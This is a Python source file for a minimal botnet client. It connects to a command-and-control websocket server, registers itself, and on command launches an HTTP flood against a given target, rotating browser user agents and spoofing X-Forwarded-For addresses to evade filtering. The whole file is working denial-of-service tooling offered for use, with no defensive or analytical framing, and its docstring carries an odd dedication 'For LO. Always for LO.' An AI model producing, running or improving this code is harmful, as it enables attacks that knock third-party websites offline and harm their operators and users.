#!/usr/bin/env python3
"""
SYNDICATE Minimal Bot – Connects to CNC and executes attacks.
For LO. Always for LO.
"""

import asyncio
import websockets
import json
import sys
import aiohttp
import random
from urllib.parse import urlparse

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

async def attack(target, duration, intensity):
    """Simple HTTP flood using aiohttp."""
    end_time = asyncio.get_event_loop().time() + duration
    connector = aiohttp.TCPConnector(limit=intensity, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        while asyncio.get_event_loop().time() < end_time:
            tasks = []
            for _ in range(intensity):
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                }
                tasks.append(session.get(target, headers=headers, timeout=5))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.01)

async def bot_loop(cnc_url):
    """Main bot loop: connect, register, handle commands."""
    bot_id = ''.join(random.choices('abcdef0123456789', k=8))
    while True:
        try:
            async with websockets.connect(cnc_url) as ws:
                await ws.send(json.dumps({'type': 'register', 'bot_id': bot_id, 'version': 'minimal'}))
                async for msg in ws:
                    cmd = json.loads(msg)
                    if cmd.get('command') == 'attack':
                        target = cmd['target']
                        method = cmd.get('method', 'GET')
                        duration = cmd.get('duration', 30)
                        intensity = cmd.get('intensity', 10)
                        asyncio.create_task(attack(target, duration, intensity))
                    elif cmd.get('command') == 'stop':
                        # Stop logic can be implemented if needed
                        pass
        except Exception as e:
            print(f"Connection lost: {e}, reconnecting in 5s...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python bot.py <cnc_websocket_url>")
        sys.exit(1)
    cnc_url = sys.argv[1]
    asyncio.run(bot_loop(cnc_url))
